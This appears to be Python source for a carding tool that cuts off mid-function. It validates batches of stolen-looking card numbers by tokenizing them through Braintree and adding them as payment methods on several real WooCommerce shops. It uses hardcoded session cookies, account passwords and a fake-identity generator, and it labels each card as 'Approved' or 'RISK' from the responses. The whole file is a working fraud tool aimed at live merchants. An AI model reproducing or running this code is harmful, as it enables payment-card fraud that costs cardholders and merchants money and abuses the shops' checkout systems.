	
	headers = {
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'payment_method': 'braintree_credit_card',
	    'wc-braintree-credit-card-card-type': 'visa',
	    'wc-braintree-credit-card-3d-secure-enabled': '',
	    'wc-braintree-credit-card-3d-secure-verified': '',
	    'wc-braintree-credit-card-3d-secure-order-total': '31.69',
	    'wc_braintree_credit_card_payment_nonce': tok,
	    'wc_braintree_device_data': '{"correlation_id":"ae65a4eaa5a994ad0ca36ebdf1971505"}',
	    'wc-braintree-credit-card-tokenize-payment-method': 'true',
	    'woocommerce-add-payment-method-nonce': add,
	    '_wp_http_referer': '/my-account/add-payment-method/',
	    'woocommerce_add_payment_method': '1',
	}
	
	response = requests.post('https://theruckshop.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
	text=response.text
	html_text=response.text
	soup = BeautifulSoup(html_text, 'html.parser')
	try:
		error_message = soup.find('div', class_='woocommerce-notices-wrapper').text.strip()
		status_code_start = error_message.find('Status code') + len('Status code')
		status_code_end = error_message.find('</div>')
		result = error_message[status_code_start:status_code_end]
	except:
		result=text
	if 'Payment method successfully added.' in text or 'Invalid postal code' in text:
		result = "1000: Approved"
	elif 'risk_threshold' in text:
		result = "RISK: Retry this BIN later."
	elif 'Please wait for 20 seconds' in text:
		result = "RISK"
	else:
		pass
	if 'avs' in result or '1000: Approved' in result or 'Invalid postal' in result or 'Insufficient Funds' in result:
		
		return 'Approved'
	else:
		
		return result
def generate_fake_address():
    ua = UserAgent()
    user = ua.random
    headers = {'user-agent': user}
    r = requests.session()
    response = r.get('https://www.prepostseo.com/tool/fake-address-generator', headers=headers)
    response = r.get('https://www.prepostseo.com/tool/fake-address-generator', headers=headers, cookies=r.cookies)
    tok = response.text.split('name="_token" content="')[1].split('" />')[0]

    # ØªØ­Ø¯ÙØ« Ø§ÙÙÙØ¯Ø±Ø² ÙØ¹ Ø§ÙØªÙÙÙ
    headers.update({
        'x-csrf-token': tok,
        'x-requested-with': 'XMLHttpRequest',
    })

    # Ø§ÙØ¨ÙØ§ÙØ§Øª ÙØ¥Ø±Ø³Ø§Ù Ø§ÙØ·ÙØ¨
    data = {'lang': 'en_US'}

    # Ø¥Ø±Ø³Ø§Ù Ø§ÙØ·ÙØ¨ ÙÙØ­ØµÙÙ Ø¹ÙÙ Ø§ÙØ¨ÙØ§ÙØ§Øª Ø§ÙÙØ²ÙÙØ©
    response = r.post('https://www.prepostseo.com/ajax/fake-address-generator', cookies=r.cookies, data=data, headers=headers).json()
    extracted_data = response[0]
    return {
        'name': extracted_data['name'],
        'email': extracted_data['email'],
        'phone': extracted_data['phone'],
        'postcode': extracted_data['postcode'],
        'street_address': extracted_data['streetAddress'],
        'city': extracted_data['city'],
        'country': extracted_data['country'],
        'state': extracted_data['state'],
        'company': extracted_data['company'],
        'gender': extracted_data['gender'],
        'credit_name': extracted_data['credit']['name'],
        'first_name': extracted_data['credit']['name'].split(' ')[0],
        'last_name': extracted_data['credit']['name'].split(' ')[1],
        'credit_expiration_date': extracted_data['credit']['expirationDate'],
        'account_no': extracted_data['accountNo'],
        'username': extracted_data['username'],
        'password': extracted_data['passw'],
        'ipv4': extracted_data['ipv4'],
        'ipv6': extracted_data['ipv6'],
        'mac_address': extracted_data['macad'],
        'semail': extracted_data['semail'],
        'user_agent': extracted_data['uagent'],
        'job_title': extracted_data['jobtitle'],
        'com_email': extracted_data['comemail'],
        'salary': extracted_data['salary'],
        'iban': extracted_data['iban'],
        'dob': extracted_data['dob'],
        'age': extracted_data['age'],
        'height': extracted_data['height'],
        'weight': extracted_data['weight'],
        'hair': extracted_data['hair'],
        'eye': extracted_data['eye'],
        'bank': extracted_data['bank'],
        'bcode': extracted_data['bcode']
    }


def cvv(ccx):
	import requests,re,base64,json,random
	from fake_useragent import UserAgent
	from bs4 import BeautifulSoup
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	lines='''gtthcd%7C1716421697%7CqR9SHLR3KftoG8aEs05av1nNO6eWREs4Afec1ipGiiS%7Cb9f8d2def5b759c24dc93e88fa23e17110fa6a4d68ce7fff0f07f6da0a76fb57
jdjejdus%7C1716421875%7C6T4O73P5G1fl3uihlSndj4cdjpEyDqME04HPNoE7S7M%7C5ecb4c8e30249e96b5f825f4278be474059e7398bad688e7b2c8acc706132369
hajahaw%7C1716422587%7CGd9RgEGqRrfNgaJJROUsLJnkEL3X1m3VdFafRUTrCl4%7C1b769c499eda0a26492bafb34f783ad9b56306b9f8144c5a7acc929262bd3a4f
bhehussh%7C1715982011%7C4pC0c81dHHu9bo0D5cGo30b4TTaG7jkSAteZKiYy8Bq%7C6261f512e637044318f817cabb448249a19a019bb334a54042f1827cd101491f
hvysr%7C1715982772%7CphIJQOb83fsyPOmHUAnLQAsogvocVSNfQC0NNjiAGme%7C0fc492952069ffaf3b02088b7a1031fd329f0fc317d6b86020354325fd95a6f4'''
	def up(big):
		cookies = {'wordpress_logged_in_07d8b92222d8e9870c923e9d0eb5ca77': big}
		headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'}
		response = requests.get('https://scrapbookandcards.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
		anonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
		enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
		dec = base64.b64decode(enc).decode('utf-8')
		au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
		with open('gates.json', 'r') as json_file:
			existing_data = json.load(json_file)
			new_data = {
				big : {
	  "nonce": anonce,
	  "au": au
				}
			}
			existing_data.update(new_data)
		with open('gates.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
	with open('fileccn.txt', 'r') as file:
		first_line = file.readline()
	lines = lines.strip().split('\n')
	while True:
		random_line_number = random.randint(0, len(lines) - 1)
		big = lines[random_line_number]
		if big == first_line:
			pass
		else:
			with open('gates.json', 'r') as file:
				json_data = json.load(file)
			try:
				nonce=json_data[big]['nonce']
				au=json_data[big]['au']
				break
			except Exception as e:
				for big in lines:
					try:
						up(big)
					except Exception as e:
						print(e)
	with open('fileccn.txt', 'w') as file:
		file.write(big)
	headers = {
		'authority': 'payments.braintree-api.com',
		'accept': '*/*',
		'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
		'authorization': f'Bearer {au}',
		'braintree-version': '2018-05-10',
		'content-type': 'application/json',
		'origin': 'https://assets.braintreegateway.com',
		'referer': 'https://assets.braintreegateway.com/',
		'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
		'clientSdkMetadata': {
			'source': 'client',
			'integration': 'custom',
			'sessionId': '1989924d-5ec5-426a-9810-ba9091a4bcee',
		},
		'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {	 token	 creditCard {	   bin	   brandCode	   last4	   cardholderName	   expirationMonth	  expirationYear	  binData {		 prepaid		 healthcare		 debit		 durbinRegulated		 commercial		 payroll		 issuingBank		 countryOfIssuance		 productId	   }	 }   } }',
		'variables': {
			'input': {
				'creditCard': {
					'number': n,
					'expirationMonth': mm,
					'expirationYear': yy,
					'cvv': cvc,
					'billingAddress': {
						'postalCode': '0000',
						'streetAddress': 'Boomsesteenweg 145, 2610 Antwerpen',
					},
				},
				'options': {
					'validate': False,
				},
			},
		},
		'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	try:
		tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
		for big in lines:
			try:
				up(big)
			except Exception as e:
				print(e)
	cookies = { 'wordpress_logged_in_07d8b92222d8e9870c923e9d0eb5ca77': big,
	    }
	
	headers = {
	    'authority': 'scrapbookandcards.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    # 'cookie': '_gid=GA1.2.129744723.1715208240; pum-153614=true; cookie_notice_accepted=true; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_07d8b92222d8e9870c923e9d0eb5ca77=markkeep72%7C1716420617%7Cba2a1gQVTuwyJNs5h9uQRWIWi5NObdDQOQtT7USvpwR%7C2ee44a0afb01d48fad33aee9a2366ec06386ab86453b9853d51005183313d38d; mcfw-wp-user-cookie=MjUyNzV8MHw2M3wzOTcwM18yY2YxNTdlZmFjMmMxZmQ2NmU0NjZjZWIwZDIwMWQyNDIwOTBjYTZkNmJkMmVlZWU3MmFhNjNlZGMxY2QzYzJm; wfwaf-authcookie-f477f216814335a577873128470ceec9=25275%7Cother%7Cread%7C163e809c19c8768eaaaccdd0a558a5d700f98d3d51f55633ae355de3228fa620; wpdiscuz_nonce_07d8b92222d8e9870c923e9d0eb5ca77=a003e3a8d0; _ga=GA1.2.44260616.1715208239; _gat_gtag_UA_216485561_1=1; _gat_UA-216485561-1=1; _ga_H57L19C2LN=GS1.1.1715208238.1.1.1715211178.38.0.0',
	    'origin': 'https://scrapbookandcards.com',
	    'referer': 'https://scrapbookandcards.com/my-account/add-payment-method/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"a6dcc47e1999101e1cc68504ba197b1f","fraud_merchant_id":null,"correlation_id":"897c0a92e6dfb5b47be312219f3e7c1e"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/jmvydy6ntnw7y758/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/jmvydy6ntnw7y758"},"merchantId":"jmvydy6ntnw7y758","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"Scrapbook & Cards Today","clientId":"AVSXYnef6QE37IRZwiBm0sChfRRFWjQODfAjBVH-h5eQ-p0ROvARotwDOwNGjhXlZFFNiQJYZu-lJ8Oj","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"scrapbookcardstodayUSD","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}
	
	response = requests.post(
	    'https://scrapbookandcards.com/my-account/add-payment-method/',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	text = response.text
	soup = BeautifulSoup(text, 'html.parser')
	result = soup.find(class_='wc-block-components-notice-banner__content').get_text(strip=True)
	if result:
		if 'avs' in result or 'Invalid postal code' in result or 'Insufficient Funds' in result:
			return 'Approved'
		elif 'Please wait for 20 seconds' in result:
			return "RISK: Retry this BIN later."
		else:
			try:
				result=result.split(':')[2]
			except:
				result=result.split(':')[1]
			return result
	else:
		result=text
	if '<head><title>Not Acceptable!</title></head><body><h1>Not Acceptable!</h1><p>An appropriate representation of the requested resource could not be found on this server. This error was generated by Mod_Security.</p></body></html>' in response.text:
		return "RISK: Retry this BIN later."
		
	if 'Payment method successfully added.' in text:
		return "1000: Approved"
	elif 'risk_threshold' in text:
		return "RISK: Retry this BIN later."
	elif 'Please wait for 20 seconds' in text:
		return "RISK: Retry this BIN later."
	else:
		
		for big in lines:
			try:
				up(big)
			except Exception as e:
				print(e)
		return "RISK: Retry this BIN later."
def auth(ccx):
	import requests,re,base64,json,random
	from fake_useragent import UserAgent
	from bs4 import BeautifulSoup
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	ua = UserAgent()
	user = ua.random
	varps=['visaspam77@gmail.com','visaspam777@gmail.com']
	def up(varp):
		r = requests.session()
		headers = {'user-agent': user}
		response = r.post('https://firefly-fields.com/my-account/add-payment-method/',headers=headers)
		nonce = (re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1))
		data = {
		    'username': varp,
		    'password': 'my-account',
		    'woocommerce-login-nonce': nonce,
		    '_wp_http_referer': '/my-account/add-payment-method/',
		    'login': 'Log in'}
		response = r.post('https://firefly-fields.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
		nonce=re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',response.text)[0]
		JWT_nonce=re.findall(r'"client_token_nonce":"(.*?)"',response.text)[0]		
		headers = {
		    'authority': 'firefly-fields.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
		    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
		    # 'cookie': 'wordpress_sec_8ac74b3414a98b6ff4fd6f539248fc0a=mska.wj-6980%7C1715377832%7CbsE5QH33aNn1A6F2pUR9x9V1yIYHh9pPvQweG60p5bw%7C36631a51eb901700570f90b53b56ac577bb211eee424d051533f9617cbca0f04; tk_or=%22https%3A%2F%2Fwww.bing.com%2F%22; cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; tk_ai=lVnMcJOg2N0GnWKChpDqwINk; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; __utmz=142726050.1713365611.2.2.utmcsr=bing|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); tk_lr=%22%22; __utma=142726050.181325669.1713184979.1714549400.1715205020.5; __utmc=142726050; __utmt=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-05-08%2021%3A50%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Ffirefly-fields.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-05-08%2021%3A50%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Ffirefly-fields.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Safari%2F537.36; _gid=GA1.2.1617601179.1715205022; wordpress_logged_in_8ac74b3414a98b6ff4fd6f539248fc0a=mska.wj-6980%7C1715377832%7CbsE5QH33aNn1A6F2pUR9x9V1yIYHh9pPvQweG60p5bw%7C6c29a9873a1d87543248b4fb1aef775bd0cf449e45522f7427b9d9dd4ae59119; tk_qs=; _gat_gtag_UA_128958617_1=1; __utmb=142726050.4.10.1715205020; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffirefly-fields.com%2Fmy-account%2Fadd-payment-method%2F; _ga_51HCC8HHHV=GS1.1.1715205021.5.1.1715205319.0.0.0; _ga=GA1.1.1448327166.1713184980',
		    'origin': 'https://firefly-fields.com',
		    'referer': 'https://firefly-fields.com/my-account/add-payment-method/',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-platform': '"Linux"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
		    'x-requested-with': 'XMLHttpRequest',
		}
		
		data = {
		    'action': 'wc_braintree_credit_card_get_client_token',
		    'nonce': JWT_nonce,
		}
		response = requests.post('https://firefly-fields.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
		no=response.json()['data']
		encoded_text = no
		decoded_text = base64.b64decode(encoded_text).decode('utf-8')
		au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
		with open('gates.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
					 varp : {
		  "nonce": nonce,
		  "au": au
					}
				
		}
		try:
			existing_data['Auth'].update(new_data)
		except:
			new_data = {"Auth": {
			 varp : {
		  "nonce": nonce,
		  "au": au
					}
				}
			}
			existing_data.update(new_data)
		import pickle
		import http.cookiejar
		with open(F'Auth_{varp}.pkl', 'wb') as f:
			pickle.dump(r.cookies, f)
		with open('gates.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
	with open('gates.json', 'r') as file:
		json_data = json.load(file)
	with open('filechk.txt', 'r') as file:
		last_acc = file.readline()
	while True:
		varp = random.choice(varps)
		if last_acc==varp:
			pass
		else:
			break
	try:
		nonce=json_data['Auth'][varp]['nonce']
		au=json_data['Auth'][varp]['au']
		import pickle
		import http.cookiejar
		with open(f'Auth_{varp}.pkl', 'rb') as f:
			c = pickle.load(f)
		r = requests.session()
		r.cookies=c
	except Exception as e:
		for varp in varps:
			up(varp)
		print(e)
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'e1636f23-9ffd-4a20-b820-03fa00946fa5',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	try:
		tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
		for varp in varps:
			up(varp)
	headers = {
    'authority': 'firefly-fields.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'tk_or=%22https%3A%2F%2Fwww.bing.com%2F%22; cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; tk_ai=lVnMcJOg2N0GnWKChpDqwINk; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; __utmz=142726050.1713365611.2.2.utmcsr=bing|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); tk_lr=%22%22; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-05-13%2021%3A53%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Ffirefly-fields.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-05-13%2021%3A53%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Ffirefly-fields.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Safari%2F537.36; __utma=142726050.181325669.1713184979.1715440202.1715637195.7; __utmc=142726050; __utmt=1; _gid=GA1.2.442064610.1715637196; wordpress_logged_in_8ac74b3414a98b6ff4fd6f539248fc0a=mska.wj-6980%7C1715810014%7C4flJsXlUxVJRhpENb6ZEmBN2mV4OAHOskUq5zzgROHu%7C32e934706ae18ce887d7fc12f1da3e729cd1628501aa5a6ed98a0bb3d8d15264; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffirefly-fields.com%2Fmy-account%2Fadd-payment-method%2F; __utmb=142726050.4.10.1715637195; tk_qs=; _ga_51HCC8HHHV=GS1.1.1715637195.7.1.1715637351.0.0.0; _ga=GA1.2.1448327166.1713184980; _gat_gtag_UA_128958617_1=1',
    'origin': 'https://firefly-fields.com',
    'referer': 'https://firefly-fields.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
}

	data = [
    ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', 'master-card'),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
    ('wc_braintree_credit_card_payment_nonce', tok),
    ('wc_braintree_device_data', '{"correlation_id":"10d81a609b9013781e6c0cb08f54f835"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"10d81a609b9013781e6c0cb08f54f835"}'),
    ('wc-braintree-paypal-context', 'shortcode'),
    ('wc_braintree_paypal_amount', '0.00'),
    ('wc_braintree_paypal_currency', 'USD'),
    ('wc_braintree_paypal_locale', 'en_us'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', nonce),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
]
	response = r.post(
	    'https://firefly-fields.com/my-account/add-payment-method/',
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	text=response.text
	html_text=response.text
	soup = BeautifulSoup(html_text, 'html.parser')
	if '<head><title>Not Acceptable!</title></head><body><h1>Not Acceptable!</h1><p>An appropriate representation of the requested resource could not be found on this server. This error was generated by Mod_Security.</p></body></html>' in response.text:
		return "RISK: Retry this BIN later."
	try:
		error_message = soup.find('div', class_='woocommerce-notices-wrapper').text.strip()
		status_code_start = error_message.find('Status code') + len('Status code')
		status_code_end = error_message.find('</div>')
		result = error_message[status_code_start:status_code_end]
		if 'avs' in result or 'Invalid postal code' in result or 'Insufficient Funds' in result:
			return 'Approved'
		elif 'Please wait for 20 seconds' in result:
			return "RISK: Retry this BIN later."
		else:
			return result
	except:
		result=text
	if 'Payment method successfully added.' in text:
		return "1000: Approved"
	else:
		for varp in varps:
			up(varp)
		return "RISK: Retry this BIN later." 
def ccx(ccx):
	import requests,re,base64,json,random
	from fake_useragent import UserAgent
	from bs4 import BeautifulSoup
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	ua = UserAgent()
	user = ua.random
	r = requests.session()
	varps=['visaspam77@gmail.com','visaspam7x7@gmail.com']
	def up(varp):
		r = requests.session()
		headers = {'user-agent': user}
		response = r.post('https://bigbattery.com/my-account/add-payment-method/',headers=headers)
		nonce = (re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1))
		data = {
		    'username': varp,
		    'password': '@FD4YBOTs1',
		    'woocommerce-login-nonce': nonce,
		    '_wp_http_referer': '/my-account/add-payment-method/',
		    'login': 'Log in'}
		response = r.post('https://bigbattery.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
		nonce=re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',response.text)[0]
		enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
		dec = base64.b64decode(enc).decode('utf-8')
		au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
		nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
		with open('gates.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
					 varp : {
		  "nonce": nonce,
		  "au": au
					}
				
		}
		try:
			existing_data['cc'].update(new_data)
		except:
			new_data = {"cc": {
			 varp : {
		  "nonce": nonce,
		  "au": au
					}
				}
			}
		
			existing_data.update(new_data)
		import pickle
		import http.cookiejar
		with open(F'CC_{varp}.pkl', 'wb') as f:
			pickle.dump(r.cookies, f)
		with open('gates.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
	with open('gates.json', 'r') as file:
		json_data = json.load(file)
	with open('filechk.txt', 'r') as file:
		last_acc = file.readline()
	while True:
		varp = random.choice(varps)
		if last_acc==varp:
			pass
		else:
			break
	try:
		nonce=json_data['cc'][varp]['nonce']
		au=json_data['cc'][varp]['au']
		import pickle
		import http.cookiejar
		with open(f'CC_{varp}.pkl', 'rb') as f:
			c = pickle.load(f)
		r = requests.session()
		r.cookies=c
	except Exception as e:
		for varp in varps:
			up(varp)
		print(e)
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
